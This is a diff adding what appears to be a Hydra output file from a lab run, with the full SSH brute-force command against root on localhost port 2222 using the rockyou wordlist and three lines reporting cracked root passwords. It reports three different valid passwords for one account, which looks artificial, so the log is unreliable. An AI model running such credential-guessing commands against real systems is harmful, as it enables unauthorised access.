@@ -1,0 +1,4 @@
+# Hydra v9.6 run at 2026-02-24 12:35:10 on localhost ssh (hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_bruteforce.txt ssh://localhost:2222)
+[2222][ssh] host: localhost   login: root   password: 12345
+[2222][ssh] host: localhost   login: root   password: password
+[2222][ssh] host: localhost   login: root   password: 123456789
